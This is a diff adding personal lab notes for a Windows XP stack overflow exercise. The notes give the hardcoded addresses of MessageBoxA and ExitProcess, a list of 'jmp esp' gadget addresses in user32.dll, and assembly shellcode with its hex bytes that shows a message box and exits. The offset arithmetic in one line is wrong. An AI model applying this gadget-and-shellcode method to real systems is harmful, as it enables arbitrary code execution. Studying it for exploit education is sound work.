@@ -1,0 +1,52 @@
+windowsxp
+
+return ebp: 0012FB24
+File offset: 13byte= 13*4 = 42word
+
+user32.dll: 0x77D10000
+MessageBoxA: 0x000407EA
+user32.dll.MessageBoxA: 0x77D10000 + 0x000407EA = 0x77D507EA
+
+kernel32.dll: 0x7C800000
+ExitProcess: 0x0001CB12
+kernel32.dll.ExitProcess: 0x7C800000 + 0x0001CB12 = 0x7C81CB12
+
+
+FindJumpEsp: 
+FFE4  jmp esp
+opcode address:0x77d8cb87
+opcode address:0x77d8ea6f
+opcode address:0x77d8f434
+opcode address:0x77d902c4
+opcode address:0x77d903f8
+opcode address:0x77d91af7
+opcode address:0x77d91bbf
+opcode address:0x77d91e64
+opcode address:0x77d91e6c
+opcode address:0x77d91e70
+opcode address:0x77d92284
+opcode address:0x77d92288
+
+XOR EBX,EBX
+PUSH EBX
+PUSH 66666666
+PUSH 23333333
+MOV EAX,esp
+PUSH EBX
+PUSH EAX
+PUSH EAX
+PUSH EBX
+MOV EAX,USER32.MessageBoxA
+CALL EAX
+PUSH EBX
+MOV EAX,KERNEL32.ExitProcess
+CALL EAX
+
+
+33 DB 68 66 66 66 66 68 33 33 33 23 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0 53 B8 12 CB 81 7C FF
+D0
+
+
+
+
+
